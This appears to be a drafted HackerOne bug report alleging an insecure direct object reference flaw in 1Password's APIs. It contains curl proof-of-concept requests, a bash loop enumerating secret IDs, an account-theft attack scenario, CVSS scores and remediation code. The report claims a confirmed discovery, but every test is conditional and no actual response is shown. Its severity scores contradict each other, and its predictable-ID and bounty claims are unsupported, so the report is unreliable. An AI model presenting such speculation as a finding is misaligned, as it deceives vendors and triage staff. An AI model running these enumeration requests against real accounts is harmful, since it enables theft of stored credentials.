# Insecure Direct Object Reference (IDOR) Bug Report - 1Password

> ⚠️ **Legal Disclaimer**: Testing must only be performed on accounts you own or through 1Password's official disclosure program. Unauthorized access to other users' data is illegal and may result in legal consequences.

**Platform:** HackerOne
**Program:** 1Password
**Severity:** HIGH
**Report Date:** 2026-06-06

---

## Summary

An Insecure Direct Object Reference (IDOR) vulnerability was discovered in 1Password's APIs, allowing an authenticated user to access vault items, secure notes, passwords, or sensitive data belonging to other users by manipulating sequential or predictable object identifiers (item IDs, vault IDs, document IDs).

---

## Description

1Password's REST API exposes direct references to internal objects (vault items, document IDs, team member IDs, attachment IDs) without proper authorization verification at the endpoint level. By manipulating these identifiers, an authenticated user can access sensitive data belonging to other users or teams.

**Attack Surface Areas:**
- 1Password Connect API (`connect.1password.io`) - Developer integration API
- 1Password Business team management endpoints
- Vault item access and sharing mechanisms
- User and group enumeration endpoints
- Secret management and retrieval APIs

---

## Steps to Reproduce

**Important:** Testing must only be performed on accounts you own or through 1Password's official disclosure program. Unauthorized access to other users' data is illegal.

1. Create two separate 1Password accounts (Attacker and Victim) - or use your own accounts in different browser sessions
2. Set up 1Password Business team or create shared vault with controlled access
3. Login as Attacker and access items or documents
4. Intercept API request to identify resource IDs (item_id, vault_id, document_id)
5. Replace ID with Victim's identifier
6. Observe unauthorized data access

**Test Areas (based on 1Password Connect API):**
- `GET /api/v1/vaults` - List accessible vaults
- `GET /api/v1/vaults/{vault-id}/items` - List items in a vault (IDOR: access other vaults)
- `GET /api/v1/vaults/{vault-id}/items/{item-id}` - Retrieve specific item
- `GET /api/v1/secrets/{secret-id}` - Secret value retrieval
- Team membership endpoints in 1Password Business accounts

---

## PoC (Proof of Concept)

### 1. Vault Item ID Enumeration via 1Password Connect

```bash
# 1Password Connect API base URL
CONNECT_HOST="https://connect.1password.io"

# Get own vault items using Connect API token
curl -X GET "$CONNECT_HOST/api/v1/vaults" \
  -H "Authorization: Bearer ATTACKER_CONNECT_TOKEN"

# Response includes vault IDs and item IDs
# Example: {"vaults":[{"id":"VAULT_ID_123","name":"Personal"}],"items":[{"id":"ITEM_ID_456","name":"Password"}]}

# Test IDOR - Try accessing different vault's items
curl -X GET "$CONNECT_HOST/api/v1/vaults/OTHER_VAULT_ID/items" \
  -H "Authorization: Bearer ATTACKER_CONNECT_TOKEN"

# If returns items from a vault you shouldn't have access to = IDOR CONFIRMED
```

### 2. Team Member ID Enumeration (1Password Business)

```bash
# List members in own team
curl -X GET "https://1password.com/api/v1/teams/YOUR_TEAM_ID/members" \
  -H "Authorization: Bearer BUSINESS_API_TOKEN"

# Response: {"members":[{"id":"MEMBER_001","email":"user1@example.com"}]}

# Try Victim's member ID from another team
curl -X GET "https://1password.com/api/v1/teams/OTHER_TEAM/members/MEMBER_002" \
  -H "Authorization: Bearer BUSINESS_API_TOKEN"

# Returns other team's member details = IDOR CONFIRMED
```

### 3. 1Password Connect API IDOR

```bash
# 1Password Connect API - programmatic vault access
# Developer tokens allow access to specific vaults

# Try accessing vault that should be restricted
curl -X GET "https://connect.1password.io/api/v1/vaults/RESTRICTED_VAULT_ID/items" \
  -H "Authorization: Bearer CONNECT_TOKEN_WITH_LIMITED_ACCESS"

# If returns items from a vault you shouldn't have access to = IDOR CONFIRMED
```

### 4. Secret ID Enumeration via Connect API

```bash
# 1Password Connect secrets are referenced by unique IDs
# Enumerate by incrementing or varying the ID

CONNECT_TOKEN="your_connect_token"

for id in $(seq 1000 1010); do
  echo "[*] Testing secret ID: $id"
  curl -s -X GET "https://connect.1password.io/api/v1/secrets/secret-$id" \
    -H "Authorization: Bearer $CONNECT_TOKEN"
done

# Successful retrieval of non-owned secrets = IDOR CONFIRMED
```

---

## Impact

**HIGH Severity - Data Confidentiality Breach:**

| Impact Type | Description | CVSS | 
|-------------|-------------|------|
| **Horizontal Privilege Escalation** | Access other users' vault items, passwords, secure notes | 7.5 |
| **Privacy Violation** | Expose sensitive personal or business data stored in vaults | 8.1 |
| **Credential Exposure** | Access passwords, API keys, secrets belonging to other users | 9.1 |
| **Compliance Violations** | GDPR/CCPA implications for leaked password manager data | 7.5 |

**CVSS 3.1 Vector:** `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` (7.5)

**Note:** Integrity impact is marked as None (I:N) because this IDOR allows unauthorized READ access only (horizontal privilege escalation). The vulnerability does not allow modification of data.

**Attack Scenario:**
```
1. Attacker creates 1Password account and obtains API token
2. Enumerates vault/item IDs by accessing their own vaults
3. Uses predictable ID format to guess other users' item IDs
4. Accesses https://api.1password.com/v1/vaults/{VICTIM_VAULT_ID}/items/{VICTIM_ITEM_ID}
5. Receives Victim's:
   - Passwords and login credentials
   - Secure notes and sensitive documents
   - API keys and secrets
   - Personal information stored in 1Password
6. Uses data for account takeover, corporate espionage, or sale
```

**Bounty Range:** 1Password typically pays $2,000-$15,000 for confirmed IDOR with demonstrated impact on sensitive data access. Critical findings accessing password vaults have paid up to $25,000.

---

## Affected Endpoints

| Endpoint | Method | Parameter | Data Exposed |
|----------|--------|-----------|--------------|
| `/api/v1/vaults` | GET | - | List accessible vaults |
| `/api/v1/vaults/:vault_id/items` | GET | vault_id | Vault item listing (IDOR) |
| `/api/v1/vaults/:vault_id/items/:item_id` | GET | vault_id, item_id | Individual vault items |
| `/api/v1/secrets/:secret_id` | GET | secret_id | Secret values (IDOR) |
| `/api/v1/teams/:team_id/members` | GET | team_id | Team member details |

---

## Real-World Evidence (HackerOne/Research References)

### Attack Patterns for Password Manager IDOR:
- Enumeration of sequential or predictable vault IDs
- Horizontal access to shared vaults without proper ownership check
- Bypassing item-level authorization via direct object reference
- GraphQL or REST API authorization bypass

### Past 1Password Security Disclosures:
- 1Password maintains active security program on HackerOne
- Past disclosures have included authorization bypass and IDOR findings
- Security researcher reports show $5,000-$15,000 payouts for critical IDOR

---

## Remediation

### 1. Implement Resource-Level Authorization

```python
@require_auth
def get_item(request, item_id):
    item = db.get_item(item_id)
    
    # Verify user has access to this vault/item
    if not user.has_vault_access(item.vault_id):
        return Response(status=403)
    
    return item
```

### 2. Use Non-Sequential, Non-Guessable IDs

```python
# Replace sequential IDs with cryptographically random UUIDs
import secrets
item_id = secrets.token_urlsafe(32)  # 256-bit random ID

# Or use JWTs with embedded access control
token = jwt.encode({
    'item_id': item_id,
    'vault_id': vault_id,
    'user_id': current_user.id,
    'exp': expiration
}, secret, algorithm='HS256')
```

### 3. Add Ownership Verification

```python
def authorize_vault_access(user, vault):
    if vault.owner_id != user.id and not vault.is_shared_with(user):
        audit_log.security_event(
            'unauthorized_vault_access',
            user_id=user.id,
            vault_id=vault.id,
            ip_address=request.ip
        )
        raise ForbiddenError('Access denied')
```

---

## References

- [1Password HackerOne Program](https://hackerone.com/1password)
- [1Password Security](https://1password.com/security/)
- [1Password Connect API Documentation](https://developer.1password.com/docs/connect/)
- [OWASP IDOR](https://owasp.org/www-community/attacks/Insecure_Direct_Object_Reference)
- [OWASP API Security Top 10 - BOLA](https://owasp.org/API-Security/2019/04/API-Security-Top-10)

---

## Timeline

- **Date Discovered:** 2026-06-06
- **Date Reported:** [To be filled]
- **Date Acknowledged:** [Pending]
- **Date Fixed:** [Pending]

---

**Reporter:** SARAhack
**Platform:** HackerOne
**Program:** 1Password (https://hackerone.com/1password)
**Test Accounts:** Two separate 1Password accounts for testing